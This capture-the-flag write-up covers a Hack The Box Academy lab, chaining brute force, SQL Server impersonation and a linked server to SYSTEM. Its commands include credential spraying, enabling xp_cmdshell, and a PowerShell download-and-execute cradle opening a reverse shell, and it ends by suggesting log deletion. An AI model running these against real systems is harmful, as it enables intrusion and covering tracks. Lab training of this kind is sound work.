---
title: "HTB Academy | Attacking Common Services"
description: "This is a hard lab writeup from the htb module attacking common services"
pubDate: "Nov 18 2024"
heroImage: "https://academy.hackthebox.com/storage/modules/116/logo.png?t=1730242916"
badge: "Hard Lab"
tags: ["Exploitation","Sql","MSSQL","Bruteforcing","Windows","Smb","Privesc","Reverse Shell"]
---


- 1. Nmap Scanning TCP OPEN Ports:

```sh
sudo nmap -sS --open --min-rate 5000 -p- -Pn -n -vvv 10.129.134.163 -oG allPorts
```

```sh
PORT     STATE SERVICE       REASON
135/tcp  open  msrpc         syn-ack ttl 127
445/tcp  open  microsoft-ds  syn-ack ttl 127
1433/tcp open  ms-sql-s      syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
```

- 1.2 Nmap basic scripts an service scanning:

```sh
nmap -sCV -p 135,445,1433,3389 10.129.134.163 -oN target
```

```python
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.134.163:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.134.163:1433: 
|     Target_Name: WIN-HARD
|     NetBIOS_Domain_Name: WIN-HARD
|     NetBIOS_Computer_Name: WIN-HARD
|     DNS_Domain_Name: WIN-HARD
|     DNS_Computer_Name: WIN-HARD
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-17T06:52:40
|_Not valid after:  2054-11-17T06:52:40
|_ssl-date: 2024-11-17T06:57:07+00:00; -1s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2024-11-16T06:52:28
|_Not valid after:  2025-05-18T06:52:28
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2024-11-17T06:56:26+00:00
|_ssl-date: 2024-11-17T06:57:06+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-17T06:56:30
|_  start_date: N/A
```

------------------------------------------


- 2. Listing available smb folders:

```ruby
❯ smbclient -N -L //10.129.134.163/

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
```


- 2.2 Download home directory:

```ruby
❯ smbclient  //10.129.134.163/home -U "" -Tc target.tar.gz
Password for [WORKGROUP\]:  # ==> Press enter
tar: dumped 5 files and 0 directories
Total bytes written: 576 (0,0 MiB/s)
```

- 2.3 Decompress the file and Search:

```python
❯ 7z x target.tar.gz

❯ tree
   -  .
   - ├──  HR
   - ├──  IT
   - │   ├──  Fiona
 118 │   │   └──  creds.txt
   - │   ├──  John
 101 │   │   ├──  information.txt
 164 │   │   ├──  notes.txt
  99 │   │   └──  secrets.txt
   - │   └──  Simon
  94 │       └──  random.txt
   - ├──  OPS
   - ├──  Projects
```


- 2.4 Create a dictionary with the credentials in the files:

```bash
❯ cat passwords
───────┬────────────────────────────────────
       │ File: passwords
───────┼────────────────────────────────────
   1   │ kAkd03SA@#!
   2   │ 48Ns72!bns74@S84NNNSl
   3   │ SecurePassword!
   4   │ Password123!
   5   │ SecureLocationforPasswordsd123!!
   6   │ 1234567
   7   │ (DK02ka-dsaldS
   8   │ Inlanefreight2022
   9   │ Inlanefreight2022!
  10   │ TestingDB123
  11   │ (k20ASD10934kadA
  12   │ KDIlalsa9020$
  13   │ JT9ads02lasSA@
  14   │ Kaksd032klasdA#
  15   │ LKads9kasd0-@
───────┴────────────────────────────────────
```

- 2.5. Brute force with crackmapexec:

```ruby
❯ crackmapexec smb 10.129.134.163 -u fiona -p passwords
SMB         10.129.134.163  445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.134.163  445    WIN-HARD         [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
SMB         10.129.134.163  445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl # ==> pass
```

------------------

- 3.1 Connection to mssql with windows authentication:

```sh
impacket-mssqlclient -p 1433 fiona@10.129.134.163 -windows-auth   
```


- 3.2 Checking remote and vinculate servers:

```sql
SQL (WIN-HARD\Fiona  guest@master)> select srvname, isremote from sysservers
srvname                 isremote   
---------------------   --------   
WINSRV02\SQLEXPRESS            1   

LOCAL.TEST.LINKED.SRV          0   
```

- 3.3 Checking if we have permissions to connect as user "fiona":

```sql
SQL (WIN-HARD\Fiona  guest@master)> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
ERROR(WIN-HARD\SQLEXPRESS): Line 1: Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'.
```

- 3.4 Searching for other users in the system database:

```
SQL (WIN-HARD\Fiona  guest@master)>  SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name    
-----   
john    

simon   

```

- 3.5 changing to user john and checking if we have permissions on LOCAL.TEST.LINKED.SRV:

```sql
SQL (WIN-HARD\Fiona  guest@master)> execute as login = 'john'
SQL (john  guest@master)> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
                
-   -   -   -   
1   1   1   1   

```

- 3.6 We have permissions as sysadmin, so let's make some configurations to execute commands in the machine:


```sql
SQL (john  guest@master)> execute('sp_configure "show advanced options",1') at [LOCAL.TEST.LINKED.SRV]
INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (john  guest@master)> execute('reconfigure') at [LOCAL.TEST.LINKED.SRV]

SQL (john  guest@master)> execute('sp_configure "xp_cmdshell",1') at [LOCAL.TEST.LINKED.SRV]
INFO(WIN-HARD\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (john  guest@master)> execute('reconfigure') at [LOCAL.TEST.LINKED.SRV]
SQL (john  guest@master)> execute('xp_cmdshell "whoami"') at [LOCAL.TEST.LINKED.SRV]
output                
-------------------   
nt authority\system   
```


- 4 Using ConPtyShell from antoniococo [Github](https://github.com/antonioCoco/ConPtyShell):

```sh
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 
```

- 4.1 In the script at last line, you can put this code and set the configuration of your machine and listeting port. Rows and columns is the size of your terminal, in my case is 48 and 162, you can use ("stty size") in your terminal to see yours.

```powershell
Invoke-ConPtyShell -RemoteIp <yourIp> -RemotePort 666 -Rows 48 -Cols 162
```


- 4.1 Preparing the Web server and listening with netcat:

```sh
python3 -m http.server 80
```

```sh
nc -nlvp 666
```

![Texto alternativo](/Pasted%20image%2020241118004402.png)

4.2 Getting and executing the script from our machine:

```sql
SQL (john  guest@master)> execute('xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString(''http://<yourIP>/PS.ps1'')" ') at [LOCAL.TEST.LINKED.SRV]
```


4.3 Searching the flag:

```powershell
PS C:\> cd C:\Users\Administrator\Desktop\
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                                                             
----                -------------         ------ ----                                                                                                             
-a----        4/21/2022   4:07 PM             27 flag.txt                                                                                                         


PS C:\Users\Administrator\Desktop> type .\flag.txt 
HTB{46u$!n9_l!nk3d_$3rv3r$}
PS C:\Users\Administrator\Desktop>  
```

- 4.4 You can get the flag and remember to delete all the logs :D
